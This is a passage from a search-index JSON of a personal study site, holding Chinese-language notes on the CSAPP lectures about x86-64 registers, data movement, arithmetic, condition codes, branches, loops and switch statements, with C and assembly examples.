<p>\u9ca8\u9c7c\u673a\uff08shark machine\uff09\u548c\u975e\u9ca8\u9c7c\u673a\u5668\uff08non-shark\uff09</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L05-Machine-Level-Programming-I-Basics/#_1","title":"\u6c47\u7f16\u4ee3\u7801\u7684\u7279\u6027","text":"<ol> <li>\u6709\u8bb8\u591a\u4e0d\u540c\u7c7b\u578b\u7684\u6574\u6570\u7c7b\u578b\uff0c\u5927\u5c0f\u5305\u62ec 1,2,4,8 \u5b57\u8282</li> <li>\u6570\u636e\u90fd\u4ee5\u6570\u5b57\u5f62\u5f0f\u5b58\u50a8\u5728\u8ba1\u7b97\u673a\u4e2d\uff0c\u4e0d\u4f1a\u6307\u660e\u662f\u6709\u65e0\u7b26\u53f7\u6216\u6570\u5b57/\u5730\u5740/\u6307\u9488</li> <li>\u6d6e\u70b9\u6570\u7279\u522b\u5904\u7406\uff0c\u5927\u5c0f\u4e3a 4,8,10 \u5b57\u8282\u7b49\uff0c\u4f7f\u7528\u7279\u6b8a\u7684\u5bc4\u5b58\u5668\u7ec4\u5b58\u50a8</li> </ol> <p>\u68c0\u67e5\u662f\u5426\u662f\u771f\u7684\u53ef\u80fd\u7684\u6c47\u7f16\uff1a\u53cd\u6c47\u7f16\u5668\uff08disassembler\uff09\uff1a\u5c06\u673a\u5668\u7801\u53cd\u6c47\u7f16\u4e3a\u6c47\u7f16\u4ee3\u7801\u3002</p> <p>\u867d\u7136\u8bf4\u6c47\u7f16\u548c\u673a\u5668\u7801\u4e00\u4e00\u5bf9\u5e94\uff0c\u4f46\u6c47\u7f16\u4e2d\u7684\u53d8\u91cf\u540d\u79f0\u6c47\u7f16\u540e\u5c31\u5b8c\u5168\u4e22\u5931\u3002</p> <pre><code>$ gcc -Og sum.c -o sum \n</code></pre> <p>\u53cd\u6c47\u7f16</p> <pre><code>$ odjdump -d sum &gt; sum.d\n</code></pre> <p>\u5f53\u7136\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 gdb \u8c03\u8bd5\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L05-Machine-Level-Programming-I-Basics/#part-3","title":"Part 3","text":"<p>x86-64 \u6574\u6570\u5bc4\u5b58\u5668\uff08integer registers\uff09\uff0c\u5171\u5341\u516d\u7c7b\uff08\u4e2a\uff09\u5bc4\u5b58\u5668</p> <p>%r--\uff1a64 \u4f4d\u7248\u672c\uff0c%e--\uff1a32 \u4f4d\u7248\u672c\uff0c%--\uff1a16 \u4f4d\u7248\u672c\u3002e \u8868\u793a extended\uff08\u76f8\u5bf9\u4e8e 16 \u4f4d\u7248\u672c\uff09\uff0cr \u8868\u793a register.</p> <p>\u6ce8\uff1a\u4ee5\u4e0b\u8868\u683c\u5728\u300a\u8ba1\u7b97\u673a\u7cfb\u7edf\uff1a\u57fa\u4e8e x86+Linux \u5e73\u53f0\u300bP89 \u9875\u4e2d\u6709\u6574\u5408</p> <p>x86-64 integer registers \u6ce8\u610f\uff0c32 \u4f4d\u7248\u672c\u5c31\u662f 64 \u4f4d\u7248\u672c\u7684\u622a\u65ad\uff0c\u5b9e\u9645\u4e0a\u662f\u5171\u7684\u4e00\u4e2a\u5bc4\u5b58\u5668\u3002</p> 64 bit 32 bit 64 bit 32 bit <code>%rax</code> <code>%eax</code> <code>%r8</code> <code>%r8d</code> <code>%rcx</code> <code>%ecx</code> <code>%r9</code> <code>%r9d</code> <code>%rdx</code> <code>%edx</code> <code>%r10</code> <code>%r10d</code> <code>%rbx</code> <code>%ebx</code> <code>%r11</code> <code>%r11d</code> <code>%rsi</code> <code>%esi</code> <code>%r12</code> <code>%r12d</code> <code>%rdi</code> <code>%edi</code> <code>%r13</code> <code>%r13d</code> <code>%rsp</code> <code>%esp</code> <code>%r14</code> <code>%r14d</code> <code>%rbp</code> <code>%ebp</code> <code>%r15</code> <code>%r15d</code> <p>IA32 registers \u6ce8\u610f\uff0c16 \u4f4d\u7248\u672c\u5c31\u662f 32 \u4f4d\u7248\u672c\u7684\u622a\u65ad\uff0c\u5b9e\u9645\u4e0a\u662f\u5171\u7684\u4e00\u4e2a\u5bc4\u5b58\u5668\uff0c8 \u4f4d\u7684\u4e24\u4e2a high-low \u7684\u5bc4\u5b58\u5668\u5c31\u5bf9\u5e94 16 \u4f4d\u7248\u672c\u7684\u4f4d\u7f6e\uff0c\u8fd8\u662f\u5171\u7684\u4e00\u4e2a\u5bc4\u5b58\u5668\u3002</p> 32 bit 16 bit 8 bit <code>%eax</code> <code>%ax</code> <code>%ah</code>\u3001<code>%al</code> <code>%ecx</code> <code>%cx</code> <code>%ch</code>\u3001<code>%cl</code> <code>%edx</code> <code>%dx</code> <code>%dh</code>\u3001<code>%dl</code> <code>%ebx</code> <code>%bx</code> <code>%bh</code>\u3001<code>%bl</code> <code>%esi</code> <code>%si</code> <code>%edi</code> <code>%di</code> <code>%esp</code> <code>%sp</code> <code>%ebp</code> <code>%bp</code> <p>\u7279\u6b8a\u7528\u9014\u7684\u5bc4\u5b58\u5668\uff1a<code>%-sp</code> \u79f0\u4e3a\u6808\u6307\u9488 \uff1astack pointer\uff1b<code>%-bp</code> \u79f0\u4e3a\u57fa\u6307\u9488\uff1abase pointer\uff0c\u4e5f\u6709\u7279\u6b8a\u7528\u9014\uff0c\u4f46\u662f\u73b0\u5728\u901a\u5e38\u4e0d\u4f7f\u7528\u5b83\u4e86\u3002</p> <p>\u64cd\u4f5c\u6570\uff08operand\uff09\u3002\u64cd\u4f5c\u6570\u6709\u4e09\u79cd\u6765\u6e90\uff1a\u7acb\u5373\u6570\uff08immediate\uff09\u3001\u5bc4\u5b58\u5668\uff08register\uff09\u3001\u5185\u5b58\uff08memory\uff09\u3002</p> <p>\u6bd4\u5982\u8bf4\uff0cmov \u6307\u4ee4\u662f\u5c06\u6e90\u590d\u5236\uff0c\u7136\u540e\u8d4b\u503c\u5230\u67d0\u5730\u3002<code>movq</code> \u6307\u4ee4\u7ed9\u51fa\u4e94\u79cd\u65b9\u5f0f\uff1a</p> direction assembly (e.g.) C analog (e.g.) Imm -&gt; Reg <code>movq $0x4,%rax</code> <code>temp = 0x4;</code> Imm -&gt; Mem <code>movq $-147,(%rax)</code> <code>*p = -147;</code> Reg -&gt; Reg <code>movq %rax,%rdx</code> <code>temp2 = temp1;</code> Reg -&gt; Mem <code>movq %rax,(%rdx)</code> <code>*p = temp;</code> Mem -&gt; Reg <code>movq (%rax),%rdx</code> <code>temp = *p</code> <p>\u8fd9\u662f\u5bb9\u6613\u7406\u89e3\u7684\uff1a\u8d4b\u503c\u7ed9\u7acb\u5373\u6570\u8fd9\u6837\u4e00\u4e2a\u5e38\u6570\u6ca1\u6709\u610f\u4e49\uff0c\u53e6\u5916\u5185\u5b58\u5230\u5185\u5b58\u51fa\u4e8e\u786c\u4ef6\u8bbe\u8ba1\u76ee\u7684\u88ab\u7981\u6b62\u4e86\u3002</p> <p>\u8bf4\u660e\uff1a</p> <p>\u200b   <code>(R)</code> \u8868\u793a\u4f7f\u7528\u8fd9\u4e2a\u5bc4\u5b58\u5668\uff0c\u6309\u7167\u5730\u5740\u5728\u5185\u5b58\u4e2d\u5bfb\u627e\uff0c\u5373 <code>Mem[Reg[R]]</code>.</p> <p>\u200b   <code>D(R)</code> \u8868\u793a\u4f7f\u7528\u7684\u540c\u65f6\u8fdb\u884c\u4e00\u4e9b\u8ba1\u7b97\uff0c\u5373 <code>Mem[Reg[R]+D]</code>. \u5176\u4e2d D \u7684\u610f\u601d\u662f displacement \u504f\u79fb\u3002</p> <p>\u200b   Intel \u683c\u5f0f\u4e2d\uff1ao \u6307\u7684\u662f oct word\uff0c\u4ee3\u8868\u516b\u5b57\uff08128 \u4f4d\uff09\uff1bq \u6307\u7684\u662f quad word\uff0c\u4ee3\u8868\u56db\u5b57\uff0864 \u4f4d\uff09\uff1bl \u6307\u4ee3 long word\uff0c\u4ee3\u8868\u957f\u5b57\uff08\u53cc\u5b57\uff0c32 \u4f4d\uff09\uff1bw \u6307\u4ee3 word\uff0c\u4ee3\u8868\u5b57\uff0816 \u4f4d\uff09\uff1bb \u6307\u4ee3 byte\uff0c\u4ee3\u8868\u5b57\u8282\uff088 \u4f4d\uff09\u3002</p> <p>\u200b   \u66f4\u4e00\u822c\u7684\u5bfb\u5740\u65b9\u5f0f\uff1a<code>D(Rb,Ri,S)</code>\uff0c\u5176\u4e2d <code>Rb</code> \u8868\u793a\u57fa\u5740\u5bc4\u5b58\u5668\uff08base register\uff09\uff0c<code>Ri</code> \u8868\u793a\u7d22\u5f15\uff08index register\uff09\uff0c<code>S</code> \u8868\u793a\u5c3a\u5ea6\uff08scale\uff09\uff0c<code>D</code> \u8fd8\u662f\u504f\u79fb\uff0c\u5b83\u6307\u7684\u662f <code>Mem[Reg[Rb]+S*Reg[Ri]+D]</code>. \u5176\u4e2d\u96c6\u4e2d\u7279\u6b8a\u60c5\u51b5\u8981\u4e48\u5728\u683c\u5f0f\u4e0a\u76f4\u63a5\u7701\u7565\u4e86\u4e00\u4e9b\u53c2\u6570\uff0c\u5206\u522b\u5199\u4e3a\uff1a<code>(Rb,Ri)</code>\u3001<code>D(Rb,Ri)</code>\u3001<code>(Rb,Ri,S)</code>\uff1b\u6216\u8005\u5728\u586b\u5199\u5904\u6d41\u7a7a\uff0c\u4f8b\u5982 <code>0x80(,%rdx,2)</code>.</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L05-Machine-Level-Programming-I-Basics/#part-4","title":"Part 4","text":"<p>lea \u6307\u4ee4\uff1aload effective address\uff0c\u548c mov \u6307\u4ee4\u7684\u533a\u522b\u5728\u4e8e\u8d4b\u503c\u7684\u662f\u5730\u5740\u800c\u4e0d\u662f\u5b9e\u9645\u503c\uff0c\u8fd9\u4e2a\u6307\u4ee4\u662f\u7528\u6765\u8ba1\u7b97\u5730\u5740\u7684\uff0c\u4e0e C \u8bed\u8a00\u4ee3\u7801\u7684\u5bf9\u5e94\u4e2d\u6709\u65f6\u51fa\u73b0\u53d6\u5730\u5740\u7b26 <code>&amp;</code>\uff0c\u7528\u5904\u6709\u4e24\u79cd\uff1a</p> <pre><code>1. \u8ba1\u7b97\u5730\u5740\u800c\u4e0d\u7528\u53d6\u5f15\u7528\uff0c\u4f8b\u5982 `p = &amp;x[i];` \uff08\u521d\u59cb\u76ee\u7684\uff09\n1. \u8fdb\u884c `x+k*y` \u7684\u6570\u503c\u8ba1\u7b97\uff0c\u5176\u4e2d `k` \u4e3a 1, 2, 4, 8. \uff08\u501f\u7528\u8ba1\u7b97\u5f62\u5f0f\uff0c\u666e\u901a\u8c03\u7528\u4e58\u6cd5\u592a\u6162\uff09\n</code></pre> <pre><code>long m12(long x) {\n    return x*12;\n}\n</code></pre> <pre><code>leaq (%rdi,%rdi,2), %rax # t &lt;- x+x*2\nsalq $2, %rax            # return t&lt;&lt;2\n</code></pre> <p>\u4e00\u4e9b\u7b97\u672f\u64cd\u4f5c\uff1a</p> <pre><code>\u4e8c\u5143\uff1a\nadd   \u52a0\nsub   \u51cf\nimul  \u7acb\u5373\u6570\u4e58\u6cd5\nsal   \u5de6\u79fb\uff0c\u7b49\u540c\u4e8e shl\nsar   \u7b97\u672f\u53f3\u79fb\nshr   \u903b\u8f91\u53f3\u79fb\nxor   \u6309\u4f4d\u5f02\u6216\nand   \u6309\u4f4d\u4e0e\nor    \u6309\u4f4d\u6216\ninstruction source, destination\ninstr src, dest # dest = dest op src\n\u4e00\u5143\uff1a\ninc   \u81ea\u52a0    dest &lt;- dest + 1\ndec   \u81ea\u51cf    dest &lt;- dest - 1\nneg   \u53d6\u8d1f    dest &lt;- -dest\nnot   \u6309\u4f4d\u53d6\u53cd dest &lt;- ~dest\n</code></pre>"},{"location":"out_class_learning/freely_learning/CSAPP/L05-Machine-Level-Programming-I-Basics/#summary-official","title":"Summary (official)","text":"<ul> <li>History of Intel processors and architectures</li> <li> <p>Evolutionary design leads to many quirks and artifacts</p> </li> <li> <p>C, assembly, machine code</p> </li> <li>New forms of visible state: program counter, registers, ...</li> <li> <p>Compiler must transform statements, expressions, procedures into low-level instructions sequences</p> </li> <li> <p>Assembly Basics: Registers. operands. move</p> </li> <li> <p>The x86-64 move instructions cover wide range of data movement forms</p> </li> <li> <p>Arithmetic</p> </li> <li>C compiler will figure out different instructions combinations to carry out computation</li> </ul>"},{"location":"out_class_learning/freely_learning/CSAPP/L06-Machine-Level-Programming-II-Control/","title":"L06 Machine-Level Programming II: Control","text":"<p>Source: https://www.bilibili.com/video/BV1iW411d7hd?p=6</p> <p>Four parts</p> <ol> <li>Control: Condition Codes</li> <li>Conditional branches</li> <li>Loops</li> <li>Switch Statements</li> </ol>"},{"location":"out_class_learning/freely_learning/CSAPP/L06-Machine-Level-Programming-II-Control/#part-1-control-condition-codes","title":"Part 1: Control: Condition Codes","text":"<p>\u6761\u4ef6\u7801\uff08condition codes\uff09\u662f\u8fd0\u7b97\u65f6\u989d\u5916\u5b58\u50a8\u7684\u6807\u5fd7\u4f4d\uff08bit flags\uff09\uff0c\u5176\u4f5c\u4e3a\u6761\u4ef6\u6307\u4ee4\uff08conditional operation\uff09\u8fd0\u4f5c\u7684\u57fa\u7840\u3002</p> <p>\u7279\u6b8a\u7684\u5bc4\u5b58\u5668\uff1a%rsp\uff0c\u610f\u4e3a stack pointer\uff0c\u4e3a\u6808\u6307\u9488\u3002</p> <p>\u53e6\u4e00\u4e2a\u7279\u6b8a\u7684\u5bc4\u5b58\u5668\uff1a%rip\uff0c\u610f\u4e3a instruction pointer\uff0c\u4e3a\u6307\u4ee4\u6307\u9488\uff0cIA32 \u4e2d\u4e3a %eip\uff0c\u5176\u5305\u542b\u7684\u662f\u5f53\u524d\u6b63\u5728\u6267\u884c\u6307\u4ee4\u7684\u5730\u5740\uff0c\u8fd9\u4e2a\u5bc4\u5b58\u5668\u4f60\u65e0\u6cd5\u76f4\u63a5\u5730\u3001\u6b63\u5e38\u5730\u8bbf\u95ee\u3002\u540c\u6837\u6709 32 \u4f4d\u7684 %eip \u548c 16 \u4f4d\u7684 %ip\uff0c\u5171\u4eab\u4e00\u4e2a\u5bc4\u5b58\u5668\u3002</p> <p>\u6761\u4ef6\u7801\u5b58\u50a8\u5728 %rflags \u8fd9\u4e2a\u72b6\u6001\u5bc4\u5b58\u5668\uff08status register\uff09\u4e0a\uff1a32 \u4f4d\u7248\u672c\u7684 %eflags \u6309\u5982\u4e0b\u65b9\u5f0f\u5b58\u50a8\uff1a</p> 0: CF 1: 1 2: PF 3: 0 4: AF 5: 0 6: ZF 7: SF 8: TF 9: IF 10:DF 11: OF 12-13: IOPL 14: NT 15: 0 16: RF 17: VM 18: AC 19: VIF 20: VIP 21: ID 22-31: 0 carry flag \u8fdb\u4f4d\u6807\u5fd7 / parity flag \u5947\u5076\u6807\u5fd7 / auxiliary carry flag \u8f85\u52a9\u8fdb\u4f4d\u6807\u5fd7 / zero flag \u96f6\u6807\u5fd7 sign flag \u7b26\u53f7\u6807\u5fd7 trap flag \u8ddf\u8e2a\u6807\u5fd7 interrupt-enable flag \u4e2d\u65ad\u8bb8\u53ef\u6807\u5fd7 direction flag \u65b9\u5411\u6807\u5fd7 overflow flag \u6ea2\u51fa\u6807\u5fd7 I/O privilege level IO \u7279\u6743\u6807\u5fd7 nested task \u5d4c\u5957\u4efb\u52a1\u6807\u5fd7 / resume flag \u6062\u590d\u6807\u5fd7 virtual-8086 mode \u865a\u62df 8086 \u65b9\u5f0f\u6807\u5fd7 alignment check \u5bf9\u9f50\u68c0\u67e5 virtual interrupt flag \u865a\u62df\u4e2d\u65ad\u6807\u5fd7 virtual interrupt pending \u865a\u62df\u4e2d\u65ad\u7b49\u5f85 ID flag \u8bc6\u522b\u6807\u5fd7 / <p>\u56db\u4e2a\u5e38\u7528\u7684\u6761\u4ef6\u7801\uff1a\u5bf9\u4e8e <code>t = a + b</code>\uff1a\u5047\u8bbe\u8fd0\u7b97\u4f4d\u6570\u4e3a \\(w\\)</p> <ul> <li>CF: carry flag (for unsigned) \u3010\u8fdb\u4f4d\u6807\u5fd7/\u65e0\u7b26\u53f7\u8fd0\u7b97\u6ea2\u51fa\u4f4d\u3011\uff1a\u4e3a\u4e24\u4e2a\u65e0\u7b26\u53f7\u6574\u6570\u76f8\u52a0\u540e\u7b2c \\(w\\) \u4f4d\uff08\\(\\operatorname{floor}(?/2^w)\\)\uff09\u3002</li> <li>ZF: zero flag \u3010\u96f6\u6807\u5fd7\u3011\uff1a\u4e3a 1 \u5f53\u4e14\u4ec5\u5f53 <code>t</code> \u4e3a 0\uff0c\u4e5f\u5373\u7b49\u4ef7\u4e3a <code>a == b</code>.</li> <li>SF: sign flag (for signed) \u3010\u7b26\u53f7\u6807\u5fd7\u3011\uff1a\u4e3a 1 \u5f53\u4e14\u4ec5\u5f53 <code>t</code> \u5c0f\u4e8e\u96f6\uff0c\u5176\u76f4\u63a5\u7b49\u4e8e <code>t</code> \u7684\u7b2c \\(w-1\\) \u4f4d\u3002</li> <li>OF: overflow flag (for signed) \u3010\u6ea2\u51fa\u6807\u5fd7/\u6709\u7b26\u53f7\u8fd0\u7b97\u6ea2\u51fa\u4f4d\u3011\uff1a\u4e3a 1 \u5f53\u4e14\u4ec5\u5f53\uff1a<code>(a &gt; 0 &amp;&amp; b &gt; 0 &amp;&amp; t &lt; 0) || (a &lt; 0 &amp;&amp; b &lt; 0 &amp;&amp; t &gt;= 0)</code>.</li> </ul> <p>\u6307\u4ee4 <code>cmp</code>\uff08compare\uff09\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a<code>cmpq src2,src1</code>\uff0c\u63a5\u4e0b\u6765\u5b83\u4f1a\u8ba1\u7b97 <code>src1 - src2</code>. \u5176\u505a\u7684\u4e8b\u60c5\u548c\u51cf\u6cd5\u6307\u4ee4\u51e0\u4e4e\u4e00\u6837\uff0c\u4f46\u662f\u53ea\u8fdb\u884c\u8fd0\u7b97\u4e0d\u8fdb\u884c\u8d4b\u503c\u3002\u663e\u7136\u8fd9\u4e2a\u6307\u4ee4\u56e0\u4e3a\u8fdb\u884c\u4e86\u8ba1\u7b97\uff0c\u6240\u4ee5\u6761\u4ef6\u7801\u4f1a\u88ab\u8bbe\u7f6e\u3002</p> <p>\u6307\u4ee4 <code>test</code>\uff08test\uff09\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff1a<code>testq src2,src1</code>\uff0c\u63a5\u4e0b\u6765\u5b83\u4f1a\u8ba1\u7b97 <code>src1 &amp; src2</code>\uff0c\u7c7b\u4f3c\u5730\uff0c\u53ea\u8fdb\u884c\u8fd0\u7b97\u4e0d\u8fdb\u884c\u8d4b\u503c\uff0c\u6761\u4ef6\u7801\u540c\u6837\u4f1a\u88ab\u8bbe\u7f6e\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u8fd9\u4e24\u4e2a\u53c2\u6570\u4f1a\u8bbe\u7f6e\u6210\u540c\u4e00\u4e2a\u53c2\u6570\uff0cZF \u5c31\u7528\u4e8e\u5224\u96f6\uff0cSF \u5c31\u7528\u4e8e\u5224\u8d1f\u3002</p> <p>\u8bbe\u7f6e\u6761\u4ef6\u7801\u6307\u4ee4\uff08\u53ef\u95f4\u63a5\u83b7\u53d6\u6807\u5fd7\u6807\u5fd7\u4f4d\uff08\uff09\uff09\uff1a</p> <p>\u200b   <code>set</code> \u6307\u4ee4\u7684\u4f5c\u7528\u662f\u5c06\u5f53\u4e2a\u5bc4\u5b58\u5668\u7684\u5355\u4e2a\u5b57\u8282\u7f6e\u503c\uff0c\u5f53\u88ab\u6539\u5199\u4e3a\u5982\u4e0b\u5f62\u5f0f\u65f6\uff0c\u5219\u4e3a\u6709\u6761\u4ef6\u5730\u8bbe\u7f6e\u3002</p> SetX Condition Description SetX Condition Description <code>sete</code> ZF Equal/Zero <code>setge</code> ~(SF^OF) GreaterOrEqual(Signed) <code>setne</code> ~ZF NotEqual/NotZero <code>setl</code> SF^OF Less(Signed) <code>sets</code> SF Negative <code>setle</code> (SF^OF)|ZF LessOrEqual(Signed) <code>setns</code> ~SF Nonnegative <code>seta</code> ~CF&amp;ZF Above(Unsigned) <code>setg</code> ~(SF^OF)&amp;~ZF Greater(Signed) <code>setb</code> CF Below(Unsigned) <p>\u4f8b\u5982\uff1a</p> <pre><code>int gt(long x, long y) {\n    return x &gt; y\n}\n/*\n%rdi   argument x\n%rsi   argument y\n%rax   return value\n*/\n</code></pre> <pre><code>cmpq   %rsi, %rdi  # compare x:y\nsetg   %al         # set when &gt;\nmovzbl %al, %eax   # zero rest of %rax\nret\n</code></pre> <p>\u8fd9\u91cc <code>movzbl</code> \u6307\u4ee4\u603b\u4f53\u4e0a\u662f <code>mov</code> \u6307\u4ee4\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u8f6c\u6362\uff1a<code>z</code> \u8868\u793a\u96f6\u6269\u5c55\uff0c<code>b</code> \u548c <code>l</code> \u5206\u522b\u8868\u793a\u5b57\u8282\uff08byte\uff0c8 \u4f4d\uff09\u548c\u957f\u5b57\uff08long word\uff0c32 \u4f4d\uff09\uff0c\u90a3\u4e48\u4e3a\u4ec0\u4e48\u4e0d\u662f <code>movzbq</code> \u5462\uff1f\u9996\u5148\u6ca1\u6709\u8fd9\u6761\u6307\u4ee4\uff0c\u5176\u6b21 <code>%rax</code> \u9ad8\u4f4d\u4f1a\u81ea\u52a8\u6e05\u96f6\u2014\u2014\u5bf9\u4f4e 32 \u4f4d\u64cd\u4f5c\u4f1a\u6e05\u7406\u9ad8 32 \u4f4d\uff0c\u8fd9\u4e2a\u89c4\u5219\u5bf9\u5b57\u8282-\u53cc\u5b57\u8282\u4e0d\u9002\u7528\uff0c\u81f3\u4e8e\u8c01\u8bbe\u8ba1\u4e86\u8fd9\u6761\u957f\u5b57-\u56db\u5b57\u89c4\u5219\uff0c\u53ea\u6709\u5929\u77e5\u9053\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L06-Machine-Level-Programming-II-Control/#part-2-conditional-branches","title":"Part 2: Conditional branches","text":"<p>jX instructions\uff08\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\uff09\uff1a</p> <p>\u4e4b\u524d\u5341\u6761 setx \u6539\u4e3a jx\uff0c\u989d\u5916\u52a0\u4e0a\u4e00\u6761\u65e0\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\uff1a<code>jmp</code>\uff0c\u6761\u4ef6\uff1a<code>1</code>\uff0c\u63cf\u8ff0\uff1aUnconditional\uff08\u65e0\u6761\u4ef6\uff09.</p> <p>\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\uff08\u8001\u5f0f\uff09</p> <pre><code>long absdiff(long x, long y) {\n    long result;\n    if (x &gt; y)\n        result = x - y;\n    else\n        result = y - x;\n    return result;\n}\n/*\n%rdi   argument x\n%rsi   argument y\n%rax   return value\n*/\n</code></pre> <p>generation:</p> <pre><code>shark&gt; gcc -Og -S -fno-if-conversion control.c\n</code></pre> <pre><code>absdiff:\n   cmpq    %rsi, %rdi # x:y\n   jle     .L4\n   movq    %rdi, %rax # branch1\n   subq    %rsi, %rax # branch1\n   ret                # branch1\n.L4:       # x &lt;= y\n   movq    %rsi, %rax # branch2\n   subq    %rdi, %rax # branch2\n   ret                # branch2\n</code></pre> <p>\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4\uff08\u4f7f\u7528 goto\uff09</p> <pre><code>long absdiff_j(long x, long y) {\n    long result;\n    int ntest = x &lt;= y;\n    if (ntest) goto Else;\n    result = x - y;\n    goto Done;\nElse:\n    result = y - x;\nDone:\n    return result;\n}\n</code></pre> <p>\u5e7f\u4e49\u6761\u4ef6\u8868\u8fbe\u5f0f\u7ffb\u8bd1\uff0c\u4f7f\u7528\u5206\u652f\uff08general conditional expressions translation with branches\uff09</p> <pre><code>val = Test ? Then_Expr : Else_Expr;\n// result = x &gt; y ? x - y : y - x;\n</code></pre> <p>Goto \u7248\u672c\uff1a</p> <pre><code>    ntest = !Test;\n    if (ntest) goto Else;\n    val = Then_Expr;\n    goto Done;\nElse:\n    val = Else_Expr;\nDone:\n    ...\n</code></pre> <p>\u4f7f\u7528\u6761\u4ef6\u79fb\u52a8\uff08conditional moves\uff09\uff1aThen \u548c Else \u7ed3\u679c\u540c\u65f6\u8ba1\u7b97\uff0c\u7136\u540e\u518d\u6839\u636e Test \u8ba1\u7b97\u51b3\u5b9a\u53d6\u54ea\u4e2a\uff0c\u5176\u4e2d\u4e0d\u9700\u8981\u6682\u505c\u5904\u7406\u5668\u7684\u6267\u884c\uff0c\u7279\u522b\u662f\u6d41\u6c34\u7ebf\u7684\u6267\u884c\uff0c\u770b\u4e0a\u53bb\u6548\u7387\u5dee\uff0c\u4f46\u53cd\u800c\u66f4\u6709\u6548\u7387\uff0c\u7279\u522b\u662f\u8ba1\u7b97\u5341\u5206\u7b80\u5355\u7684\u65f6\u5019\u8fd9\u4e00\u4f18\u70b9\u66f4\u52a0\u7a81\u51fa\uff1a\u8fd9\u8981\u5f97\u76ca\u4e8e\u6d41\u6c34\u7ebf\u6280\u672f\uff0c\u7279\u522b\u662f\u5176\u4e2d\u7684\u6307\u4ee4\u8df3\u8f6c\u9884\u6d4b\u3002</p> <p>\u666e\u901a C \u4ee3\u7801\u548c\u524d\u8ff0\u4e00\u81f4\uff0cGoto \u7248\u672c\u5982\u4e0b\uff1a</p> <pre><code>    result = Then_Expr;\n    eval = Else_Expr;\n    nt = !Test;\n    if (nt) result = eval;\n    return result;\n</code></pre> <pre><code>absdiff:\n    movq    %rdi, %rax  # x\n    subq    %rsi, %rax  # result = x - y\n    movq    %rsi, %rdx\n    subq    %rdi, %rdx  # eval = y - x\n    cmpq    %rsi, %rdi  # x:y\n    cmovle  %rdx, %rax  # if &lt;=, result = eval\n    ret\n</code></pre> <p>\u6761\u4ef6\u79fb\u52a8\u5f88\u574f\u7684\u60c5\u51b5\uff1a</p> <ol> <li>\u5404\u5206\u652f\u8ba1\u7b97\u82b1\u8d39\u5927</li> </ol> <pre><code>val = Test(x) ? Hard1(x) : Hard2(x);\n</code></pre> <ol> <li>\u8ba1\u7b97\u6709\u98ce\u9669</li> </ol> <pre><code>val = p ? *p : 0;\n</code></pre> <p>\u89e3\u5f15\u7528\u53ef\u4ee5\u5417\uff1f\u8fd9\u6bb5\u4ee3\u7801\u903b\u8f91\u4e0a\u6765\u8bf4\u6ca1\u95ee\u9898\uff0c\u975e\u7a7a\u5219\u53d6\u5176\u6307\u5411\u7684\u503c\uff0c\u4f46\u7a7a\u6307\u9488\u89e3\u5f15\u7528\u7206\u4e86\u2014\u2014\u8ba1\u7b97\u5b58\u5728\u98ce\u9669\u3002</p> <ol> <li>\u8ba1\u7b97\u6709\u526f\u4f5c\u7528</li> </ol> <pre><code>val = x &gt; 0 ? x *= 7 : x += 3;\n</code></pre> <p>\u4e24\u4e2a\u5206\u652f\u7684\u8ba1\u7b97\u53ef\u80fd\u4ea7\u751f\u526f\u4f5c\u7528\u5e72\u6270\u3002</p> <p>\u4ee5\u4e0a\u4e09\u79cd\u60c5\u51b5\uff0c\u7f16\u8bd1\u5668\u4e0d\u4f1a\u91c7\u7528\u6761\u4ef6\u79fb\u52a8\u4f18\u5316\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L06-Machine-Level-Programming-II-Control/#part-3-loops","title":"Part 3: Loops","text":"<p>Do-While \u5faa\u73af\u7684\u4f8b\u5b50\uff1aC \u8bed\u8a00\u4ee3\u7801\uff1a</p> <pre><code>long pcount_do(unsigned long x) {\n    long result = 0;\n    do {\n        result += x &amp; 0x1;\n        x &gt;&gt;= 1;\n    } while(x);\n    return result;\n}\n</code></pre> <p>goto \u7248\u672c\uff1a</p> <pre><code>long pcount_do(unsigned long x) {\n    long result = 0;\nloop:\n    result += x &amp; 0x1;\n    x &gt;&gt;= 1;\n    if (x) goto loop;\n    return result;\n}\n</code></pre> <p>\u6ce8\uff1a\u4ee5\u4e0a\u51fd\u6570\u7528\u4e8e\u8ba1\u7b97\u6570\u636e\u5728\u4e8c\u8fdb\u5236\u4e0b 1 \u7684\u4e2a\u6570\uff0c\u4e00\u822c\u79f0\u4e3a <code>popcount()</code> \u51fd\u6570\u3002</p> <pre><code>do\n    Body\n    while (Test);\n-------------------------------\nloop:\n    Body\n    if (Test)\n        goto loop;\n===============================\nwhile Test\n    Body\n-------------------------------\n    goto test;\nloop:\n    Body\ntest:\n    if (Test)\n        goto loop:\ndone:\n-------------------------------\n    if (!Test)\n        goto done;\nloop:\n    Body\n    if (Test)\n        goto loop;\ndone:\n===============================\n</code></pre> <p>for \u5faa\u73af\u5f62\u5f0f\uff1a</p> <pre><code>for (Init; Test; Update)\n    Body\n-------------------------------\nInit;\nwhile (Test) {\n    Body\n    Update;\n}\n</code></pre> <p>\u663e\u7136\u8fd9\u4e9b\u5faa\u73af\u7f16\u8bd1\u8fc7\u7a0b\u4e2d\u6709\u5f88\u5927\u4f18\u5316\u7a7a\u95f4\uff0c\u5b9e\u9645\u4e0a\u4e5f\u786e\u5b9e\u4f18\u5316\u4e86\u5f88\u591a\u3002</p>"},{"location":"out_class_learning/freely_learning/CSAPP/L06-Machine-Level-Programming-II-Control/#part-4-switch-statements","title":"Part 4: Switch Statements","text":"<pre><code>long switch_eg(long x, long y, long z) {\n    long w = 1;\n    switch(x) {\n    case 1:\n        w = y * x;\n        break;\n    case 2:\n        w = y / z;\n        /* Fall Through */\n    case 3:\n        w += z\n        break;\n    case 5:\n    case 6:\n        w -= z;\n        break;\n    default:\n        w = 2;\n    }\n    return w;\n}\n</code></pre> <p>switch 